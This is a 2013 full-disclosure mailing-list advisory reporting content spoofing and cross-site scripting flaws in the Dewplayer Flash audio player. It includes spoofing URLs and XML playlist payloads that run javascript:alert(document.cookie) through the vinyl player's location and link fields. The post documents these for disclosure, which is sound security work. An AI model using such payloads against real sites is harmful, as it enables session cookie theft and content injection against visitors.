
Date: Mon, 23 Dec 2013 16:40:46 +0200
From: "MustLive" <mustlive@...security.com.ua>
To: <submissions@...ketstormsecurity.org>, <full-disclosure@...ts.grok.org.uk>
Subject: Vulnerabilities in Dewplayer

Hello list!

I want to inform you about vulnerabilities in Dewplayer.

These are Content Spoofing and Cross-Site Scripting vulnerabilities. There 
are near 422 000 web sites with dewplayer.swf in Google's index. And it's 
just one file name and there are other file names of this player (such as 
dewplayer-en.swf and others).

-------------------------
Affected products:
-------------------------

Vulnerable are Dewplayer 2.2.2 and previous versions.

-------------------------
Affected vendors:
-------------------------

Alsacreations
http://www.alsacreations.fr

----------
Details:
----------

Content Spoofing (Content Injection) (WASC-12):

http://site/dewplayer.swf?mp3=1.mp3

http://site/dewplayer.swf?file=1.mp3

http://site/dewplayer.swf?sound=1.mp3

http://site/dewplayer.swf?son=1.mp3

This is for old versions of the player. In versions Dewplayer 2.x there is 
only mp3 from these 4 variants.

Content Spoofing (Content Injection) (WASC-12):

http://site/dewplayer.swf?xml=1.xml

1.xml

<playlist version="1">
<trackList>
<track>
<location>http://site/1.mp3</location>
<creator/>
<album/>
<title>Music</title>
<annotation/>
<duration/>
<image/>
<info/>
<link/>
</track>
</trackList>
</playlist>

2.xml (with image)

<playlist version="1">
<trackList>
<track>
<location>http://site/1.mp3</location>
<creator/>
<album/>
<title>Music</title>
<annotation/>
<duration/>
<image>http://site/1.jpg</image>
<info/>
<link/>
</track>
</trackList>
</playlist>

XSS (WASC-08):

Only vinyl version of Dewplayer are vulnerable to Cross-Site Scripting.

http://site/dewplayer-vinyl.swf?xml=xss.xml
http://site/dewplayer-vinyl-en.swf?xml=xss.xml

xss.xml

<playlist version="1">
<trackList>
<track>
<location>javascript:alert(document.cookie)</location>
<title>XSS</title>
</track>
</trackList>
</playlist>

http://site/dewplayer-vinyl.swf?xml=xss2.xml
http://site/dewplayer-vinyl-en.swf?xml=xss2.xml

xss2.xml

<playlist version="1">
<trackList>
<track>
<location>1.mp3</location>
<title>XSS</title>
<link>javascript:alert(document.cookie)</link>
</track>
</trackList>
</playlist>

------------
Timeline:
------------ 

2013.10.25 - announced at my site.
2013.10.26 - informed developers.
2013.12.19 - disclosed at my site (http://websecurity.com.ua/6831/).

Best wishes & regards,
MustLive
Administrator of Websecurity web site
http://websecurity.com.ua 


_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
